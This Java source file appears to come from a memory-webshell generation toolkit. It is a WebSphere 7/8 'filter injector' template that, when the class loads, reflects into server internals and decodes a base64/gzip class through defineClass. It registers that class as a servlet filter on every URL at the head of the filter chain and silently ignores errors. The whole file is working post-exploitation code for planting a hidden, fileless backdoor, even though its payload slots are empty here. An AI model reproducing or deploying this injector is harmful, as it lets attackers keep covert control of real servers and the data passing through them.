package jmg.core.template;

import javax.servlet.Filter;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.GZIPInputStream;


/**
 * tested v7、v8
 * update  2023/07/08
 */
public class WebSphereFilterInjectorTpl {
    public String getUrlPattern() {
        return "/*";
    }


    public String getClassName() {
        return "";
    }

    public String getBase64String() throws IOException {
        return "";
    }

    static {
        new WebSphereFilterInjectorTpl();
    }


    public WebSphereFilterInjectorTpl() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getFilter(context);
                addFilter(context, filter);
            }
        } catch (Exception ignored) {

        }

    }


    public List<Object> getContext() throws Exception {
        List<Object> contexts = new ArrayList<Object>();
        Object context;
        Object obj = getFV(Thread.currentThread(), "wsThreadLocals");
        Object[] wsThreadLocals = (Object[]) obj;
        for (Object wsThreadLocal : wsThreadLocals) {
            obj = wsThreadLocal;
            // for websphere 7.x
            if (obj != null && obj.getClass().getName().endsWith("FastStack")) {
                Object[] stackList = (Object[]) getFV(obj, "stack");
                for (Object stack : stackList) {
                    try {
                        Object config = getFV(stack, "config");
                        context = getFV(getFV(config, "context"), "context");
                        contexts.add(context);
                    } catch (Exception ignored) {
                    }
                }
            } else if (obj != null && obj.getClass().getName().endsWith("WebContainerRequestState")) {
                context = getFV(getFV(getFV(getFV(getFV(obj, "currentThreadsIExtendedRequest"), "_dispatchContext"), "_webapp"), "facade"), "context");
                contexts.add(context);
            }
        }
        return contexts;
    }


    public void addFilter(Object context, Object filter) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException {
        String filterName = getFilterName(getClassName());
        try {
            if (!isAdded(context, filterName)) {
                Class filterMappingClass;
                Class iFilterConfigClass;
                Class iServletConfigClass;
                ClassLoader classLoader;
                try {
                    classLoader = context.getClass().getClassLoader();
                    filterMappingClass = classLoader.loadClass("com.ibm.ws.webcontainer.filter.FilterMapping");
                    iFilterConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.filter.IFilterConfig");
                    iServletConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.servlet.IServletConfig");
                } catch (Exception e) {
                    classLoader = Thread.currentThread().getContextClassLoader();
                    filterMappingClass = classLoader.loadClass("com.ibm.ws.webcontainer.filter.FilterMapping");
                    iFilterConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.filter.IFilterConfig");
                    iServletConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.servlet.IServletConfig");
                }

                Object filterManager = getFV(context, "filterManager");
                try {
                    // v8
                    Constructor<?> constructor = filterMappingClass.getConstructor(String.class, iFilterConfigClass, iServletConfigClass);
                    // com.ibm.ws.webcontainer.webapp.WebApp.commonAddFilter
                    setFV(context, "initialized", false);
                    Object filterConfig = invokeMethod(context, "commonAddFilter", new Class[]{String.class, String.class, Filter.class, Class.class}, new Object[]{filterName, getClassName(), filter, filter.getClass()});
                    Object filterMapping = constructor.newInstance(getUrlPattern(), filterConfig, null);
                    setFV(context, "initialized", true);

                    // com.ibm.ws.webcontainer.filter.WebAppFilterManager.addFilterMapping
                    invokeMethod(filterManager, "addFilterMapping", new Class[]{filterMappingClass}, new Object[]{filterMapping});

                    // com.ibm.ws.webcontainer.filter.WebAppFilterManager#_loadFilter
                    invokeMethod(filterManager, "_loadFilter", new Class[]{String.class}, new Object[]{filterName});

                } catch (Exception e) {
                    // v7
                    Object filterConfig = invokeMethod(context, "createFilterConfig", new Class[]{String.class}, new Object[]{filterName});
                    invokeMethod(filterConfig, "setFilterClassName", new Class[]{String.class}, new Object[]{filter.getClass().getName()});
                    setFV(filterConfig, "dispatchMode", new int[]{0});
                    setFV(filterConfig, "name", filterName);
                    invokeMethod(context, "addMappingFilter", new Class[]{String.class, iFilterConfigClass}, new Object[]{getUrlPattern(), filterConfig});
                    ArrayList _uriFilterMappings = (ArrayList) getFV(filterManager, "_uriFilterMappings");
                    int lastIndex = _uriFilterMappings.size() - 1;
                    Object lastElement = _uriFilterMappings.remove(lastIndex);
                    _uriFilterMappings.add(0, lastElement);
                    invokeMethod(filterManager, "_loadFilter", new Class[]{String.class}, new Object[]{filterName});

                }
                // 清除缓存
                invokeMethod(getFV(filterManager, "chainCache"), "clear");
            }
        } catch (Exception ex) {
        }
    }

    public String getFilterName(String className) {
        if (className.contains(".")) {
            int lastDotIndex = className.lastIndexOf(".");
            return className.substring(lastDotIndex + 1);
        } else {
            return className;
        }
    }

    public boolean isAdded(Object context, String filterName) throws Exception {
        Object webAppConfiguration = getFV(context, "config");
        List filerMappings = (List) invokeMethod(webAppConfiguration, "getFilterMappings");
        for (int i = 0; i < filerMappings.size(); i++) {
            Object config = invokeMethod(filerMappings.get(i), "getFilterConfig");
            String name = (String) invokeMethod(config, "getFilterName");
            if (name.equals(filterName)) {
                return true;
            }
        }
        return false;
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }

    public Object getFilter(Object context) {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            filter = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class filterClass = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = filterClass.newInstance();
            } catch (Throwable ignored) {
            }
        }
        return filter;
    }

    public static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    private static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj.getClass(), fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    private static void setFV(Object obj, String fieldName, Object fieldValue) throws Exception {
        getF(obj.getClass(), fieldName).set(obj, fieldValue);
    }

    private static Field getF(Class<?> clazz, String fieldName) throws NoSuchFieldException {
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }
}
